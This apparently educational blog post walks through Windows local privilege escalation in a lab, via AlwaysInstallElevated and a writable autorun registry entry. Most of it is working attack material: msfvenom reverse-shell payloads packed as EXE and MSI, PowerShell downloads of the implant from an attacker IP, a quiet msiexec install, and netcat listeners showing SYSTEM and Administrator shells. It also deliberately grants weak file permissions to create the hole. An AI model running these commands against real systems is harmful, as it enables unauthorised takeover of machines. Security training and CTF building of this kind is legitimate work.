---
title: Windows Local Privilege Escalation - Registry Hives for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: "Windows Local Privilege Escalation - Registry Hives"
license: ""
images: []
date: 2022-03-20 11:33:00 +0800
categories: [Windows Local Privilege Escalation]
tags: [registry hives, alwaysinstallelevated, autorun, local privilege escalation, windows]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...
summary: "Registry, settings, permissions... you name it (<|<)"
---


# Registry Hives

Registry hives are essential components of the Windows operating system's registry. They are logical groups of keys, subkeys, and values that store configuration settings and options for the operating system and installed applications. Each hive is associated with a set of supporting files that are loaded into memory when the system starts or a user logs in.

Here are the main registry hives:

1. **HKEY_CLASSES_ROOT (HKCR)**: Contains information about registered applications, including file associations and OLE object class IDs.
2. **HKEY_CURRENT_USER (HKCU)**: Stores settings and preferences for the currently logged-in user.
3. **HKEY_LOCAL_MACHINE (HKLM)**: Contains configuration settings for the local computer, including hardware and software settings.
4. **HKEY_USERS (HKU)**: Holds user-specific settings for all users on the system.
5. **HKEY_CURRENT_CONFIG (HKCC)**: Contains information about the current hardware profile used by the system.

Each hive has its own set of supporting files, typically located in the `%SystemRoot%\System32\Config` directory. These files are updated whenever changes are made to the registry.


# Privilege Escalation via AlwaysInstallElevated

The [MSI Wrapper](https://www.exemsi.com/) is for software developers who have a setup executable file and want to offer an MSI that wraps their original setup executable file. It is also useful for system administrators with a `setup.exe` they want to distribute as an MSI to client computers in their organization.

Once you have downloaded the MSI Wrapper:

{{< image src="/images/posts/msi-wrapper-downloaded.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-downloaded.png" src_l="/images/posts/msi-wrapper-downloaded.png" >}}

Execute the setup wizard and click `Next`:

{{< image src="/images/posts/msi-wrapper-1.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-1.png" src_l="/images/posts/msi-wrapper-1.png" >}}

Accept the License Agreement and click `Next`:

{{< image src="/images/posts/msi-wrapper-2.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-2.png" src_l="/images/posts/msi-wrapper-2.png" >}}

We can change the destination folder if we want, I will leave it as it is:

{{< image src="/images/posts/msi-wrapper-3.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-3.png" src_l="/images/posts/msi-wrapper-3.png" >}}

Then click `Install`:

{{< image src="/images/posts/msi-wrapper-4.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-4.png" src_l="/images/posts/msi-wrapper-4.png" >}}

Once it is completed, click on `Finish`:

{{< image src="/images/posts/msi-wrapper-5.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-5.png" src_l="/images/posts/msi-wrapper-5.png" >}}

Optionally, we could create a desktop shortcut or pin to the taskbar:

{{< image src="/images/posts/msi-wrapper-6.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-6.png" src_l="/images/posts/msi-wrapper-6.png" >}}

Generate an executable reverse shell:

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.130 LPORT=443 -f exe -o implant.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: implant.exe
```

Setup an HTTP listener:

```bash
❯ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.119.129 - - [06/Mar/2022 17:54:06] "GET /implant.exe HTTP/1.1" 200 -
```

Download the file with powershell:

```powershell
PS C:\Tools> wget 192.168.119.130/implant.exe -O implant.exe
```

This will be the MSI wrapper configuration file `msi_template.xml`:

```xml
<MsiWrapper>
  <Installer>
    <IconFile Detect="executable" Value="" />
    <Output FileName="C:\Tools\implant.msi" />
    <InstallPrivileges Value="Elevated" />
    <PerUser Value="yes" />
    <ElevateExecutable Value="always" />
    <UpgradeCode Value="{55F46570-1C98-4098-9191-18B383E567D3}" />
    <ProductId Value="" />
    <Registration Value="None" />
    <Manufacturer Detect="" Value="Holo Industries" />
    <ProductVersion Detect="executable" Value="0.0.0.0" />
    <ProductName Detect="" Value="Holo" />
    <Comments Detect="executable" Value="" />
    <Contact Detect="" Value="" />
    <HelpLink Detect="" Value="" />
    <UpdateLink Detect="" Value="" />
    <AboutLink Detect="" Value="" />
  </Installer>
  <WrappedInstaller>
    <Executable FileName="C:\Tools\implant.exe" SuccessCodes="" Impersonate="no" IncludeFiles="no" CompressionLevel="Max" />
    <ApplicationId Value="" />
    <Install>
      <Arguments Value="">
        <UILevelNone Value="" />
        <UILevelBasic Value="" />
        <UILevelReduced Value="" />
        <UILevelFull Value="" />
      </Arguments>
      <RunBeforeInstall Value="" />
      <RunAfterInstall Value="" />
    </Install>
    <Uninstall>
      <Arguments Value="">
        <UILevelNone Value="" />
        <UILevelBasic Value="" />
        <UILevelReduced Value="" />
        <UILevelFull Value="" />
      </Arguments>
    </Uninstall>
  </WrappedInstaller>
</MsiWrapper>
```

Then we're gonna execute MSI Wrapper and click on `Load Settings`:

{{< image src="/images/posts/msi-wrapper-7.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-7.png" src_l="/images/posts/msi-wrapper-7.png" >}}

Open the configuration file:

{{< image src="/images/posts/msi-wrapper-8.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-8.png" src_l="/images/posts/msi-wrapper-8.png" >}}

Once the configuration is loaded, click `Ok` and then click on `Next >`:

{{< image src="/images/posts/msi-wrapper-9.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-9.png" src_l="/images/posts/msi-wrapper-9.png" >}}

Verify the executable and the implant MSI package:

{{< image src="/images/posts/msi-wrapper-10.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-10.png" src_l="/images/posts/msi-wrapper-10.png" >}}

This setting is up to you:

{{< image src="/images/posts/msi-wrapper-11.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-11.png" src_l="/images/posts/msi-wrapper-11.png" >}}

Make sure the Security and User Context are correct:

{{< image src="/images/posts/msi-wrapper-12.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-12.png" src_l="/images/posts/msi-wrapper-12.png" >}}

Click next until the build:

{{< image src="/images/posts/msi-wrapper-13.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-13.png" src_l="/images/posts/msi-wrapper-13.png" >}}

After building the MSI package we will receive a message like this:

{{< image src="/images/posts/msi-wrapper-14.png" caption="MSI Wrapper " src_s="/images/posts/msi-wrapper-14.png" src_l="/images/posts/msi-wrapper-14.png" >}}

Now click `Exit` and navigate to the MSI package:

```powershell
PS C:\Users\user> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== =============================================
desktop-bn\user S-1-5-21-264094270-2388996790-3434637240-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Performance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled        Change the time zone                 Disabled
```

Install the MSI package quietly:

```powershell
msiexec /quiet /qn /i c:\Tools\implant.msi
```

After executing the malicious MSI, we receive a reverse shell as `NT AUTHORITY SYSTEM`:

```powershell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.119.130] from (UNKNOWN) [192.168.119.129] 58480
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\SysWOW64>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                            Attributes       
==================================== ================ ============================================================== ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                    
Everyone                             Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6                                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\msiserver                 Well-known group S-1-5-80-685333868-2237257676-1431965530-1907094206-2438021966 Enabled by default, Enabled group, Group owner
LOCAL                                Well-known group S-1-2-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544                                                   Enabled by default, Enabled group, Group owner


PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
SeLockMemoryPrivilege           Lock pages in memory                      Enabled
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeTcbPrivilege                  Act as part of the operating system       Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeCreatePermanentPrivilege      Create permanent shared objects           Enabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeAuditPrivilege                Generate security audits                  Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled

ERROR: Unable to get user claims information.
```

If we execute Process Hacker as Administrator we can see the process tree:

{{< image src="/images/posts/process-hacker-autoelevate.png" caption="Process Hacker AutoElevate " src_s="/images/posts/process-hacker-autoelevate.png" src_l="/images/posts/process-hacker-autoelevate.png" >}}

> Note: In the case that you don't see the process tree, double click on the Name column to change the view. You may need to double click (change the view) multiple times.

Alternatively, we can just generate an MSI reverse shell:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.130 LPORT=443 -f msi -o implant.msi
```

> Note: This can be easily detected by modern AVs.

Setup an HTTP listener with python:

```shell
sudo python3 -m http.server
```

Download the malicious MSI file to the current working directory:

```powershell
wget 192.168.146.128:8000/reverse.msi -o reverse.msi
```

Attempt to install reverse.msi by executing the following command:

```powershell
 .\reverse.msi
```

In the UAC, click `Yes` and wait for the connection:

{{< image src="/images/posts/registry-uac.png" caption="UAC Registry " src_s="/images/posts/registry-uac.png" src_l="/images/posts/registry-uac.png" >}}

Receive the connection:

```shell
sudo nc -lvnp 443
```


# Privilege Escalation via Autorun Registry

Run PowerShell or the command prompt as administrator and then create the directory:

```powershell
PS C:\Windows\system32> md "C:\Program Files\Autorun Program"


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/6/2022   8:03 PM                Autorun Program
```

Add a dummy program:

```powershell
PS C:\Windows\system32> copy C:\Windows\System32\locator.exe "C:\Program Files\Autorun Program\program.exe"
```

Grant to the `Everyone` group full permissions:

```powershell
PS C:\Windows\system32> icacls "C:\Program Files\Autorun Program\program.exe" /grant "Authenticated Users:F"
processed file: C:\Program Files\Autorun Program\program.exe
Successfully processed 1 files; Failed processing 0 files
```

 Add the program to run at startup via registry:
 
```powershell
PS C:\Windows\system32> reg add HKLM\software\microsoft\windows\currentversion\run /v "My Program" /t REG_SZ /d "C:\Program Files\Autorun Program\program.exe" /f
The operation completed successfully.

PS C:\Windows\system32> dir "C:\Program Files\Autorun Program\program.exe"


    Directory: C:\Program Files\Autorun Program


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/5/2021   8:05 AM          28672 program.exe
```

We can review the permissions:

```powershell
PS C:\> icacls "C:\Program Files\Autorun Program\program.exe"
C:\Program Files\Autorun Program\program.exe NT AUTHORITY\Authenticated Users:(F)
                                             Everyone:(F)
                                             NT AUTHORITY\SYSTEM:(I)(F)
                                             BUILTIN\Administrators:(I)(F)
                                             BUILTIN\Users:(I)(RX)
                                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Alternatively, we can use accesschk from SysInternals:

```powershell
PS C:\> C:\Tools\SysinternalsSuite\accesschk64.exe -accepteula -wvu "C:\Program Files\Autorun Program"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\Authenticated Users
        FILE_ALL_ACCESS
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

From the output above we can see that the "`NT AUTHORITY\Authenticated Users`" user group has "`FILE_ALL_ACCESS`" permission on the "program.exe" file.

Open command prompt or PowerShell as **administrator** and run the Autoruns GUI app: 

```powershell
C:\Tools\SysinternalsSuite\Autoruns64.exe
```

> Note: If the Autoruns64.exe GUI doesn't show the "My Program" autorun registry key, try executing as administrator first.

In Autoruns, click on the ‘Logon’ tab and from the listed results, notice that the “My Program” entry is pointing to “`C:\Program Files\Autorun Program\program.exe`”:

{{< image src="/images/posts/autoruns-program.exe.png" caption="AutoRuns Program " src_s="/images/posts/autoruns-program.exe.png" src_l="/images/posts/autoruns-program.exe.png" >}}

The command line version of autoruns is `autorunsc.exe` (can be executed as medium-integrity level / low privileged user):

```powershell
PS C:\Program Files\Autorun Program> C:\Tools\SysinternalsSuite\autorunsc64.exe -accepteula -a l

Sysinternals Autoruns v14.09 - Autostart program viewer
Copyright (C) 2002-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


<...SNIP...>

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   SecurityHealth
     %windir%\system32\SecurityHealthSystray.exe
     Windows Security notification icon
     Microsoft Corporation
     10.0.22000.65
     c:\windows\system32\securityhealthsystray.exe
     12/2/1926 7:27 PM
   VMware User Process
     "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
     VMware Tools Core Service
     VMware, Inc.
     11.3.5.31214
     c:\program files\vmware\vmware tools\vmtoolsd.exe
     8/31/2021 5:27 AM
   My Program
     "C:\Program Files\Autorun Program\program.exe"
     c:\program files\autorun program\program.exe


<...SNIP...>
```

Since we have write permissions to `C:\Program Files\Autorun Program\program.exe` we can replace it with a payload or an implant. In this case, I will generate an executable reverse shell:

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.130 LPORT=443 -f exe -o implant.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: implant.exe
```

Then I will setup an HTTP listener on my attacker machine:

```bash
❯ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Transfer and replace the original executable with PowerShell:

```powershell
PS C:\> wget 192.168.119.130/implant.exe -O "C:\Program Files\Autorun Program\program.exe"
```

On the attacker machine, we will set up a listener:

```bash
❯ nc -lvnp 443
```

Now let's sign out and sign in as Administrator and wait a bit, once we have waited we should receive a connection as the Administrator user:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.119.130] from (UNKNOWN) [192.168.119.129] 58708
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                     SID                                  
============================= ============================================
desktop-bn\administrator S-1-5-21-264094270-2388996790-3434637240-500


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Performance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                           


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

> Note: A firewall or an antivirus/anti-malware might block the connection.

We can use Process Hacker to view the process token:

{{< image src="/images/posts/process-hacker-autoruns.png" caption="Process Hacker AutoRuns " src_s="/images/posts/process-hacker-autoruns.png" src_l="/images/posts/process-hacker-autoruns.png" >}}

We can also view the connection with TCPView:

{{< image src="/images/posts/tcpview-program.exe.png" caption="TCPView " src_s="/images/posts/tcpview-program.exe.png" src_l="/images/posts/tcpview-program.exe.png" >}}

We could also use the TCPView command line version:

```powershell
PS C:\Tools\SysinternalsSuite> .\tcpvcon.exe

Tcpvcon.exe v4.17 - Sysinternals TcpVcon
Copyright (C) 1996-2022 Mark Russinovich & Bryce Cogswell
Sysinternals - www.sysinternals.com

[TCP] svchost.exe
        PID:    2980
        State:  ESTABLISHED
        Local:  desktop-bn.localdomain
        Remote: 40.83.240.146
[TCP] program.exe
        PID:    16460
        State:  ESTABLISHED
        Local:  desktop-bn.localdomain
        Remote: 192.168.119.130
[TCP] [System Process]
        PID:    0
        State:  TIME_WAIT
        Local:  desktop-bn.localdomain
        Remote: 52.143.80.209
[TCP] explorer.exe
        PID:    11356
        State:  ESTABLISHED
        Local:  desktop-bn.localdomain
        Remote: 52.184.206.73
[TCP] svchost.exe
        PID:    3568
        State:  ESTABLISHED
        Local:  desktop-bn.localdomain
        Remote: 52.143.84.45
```
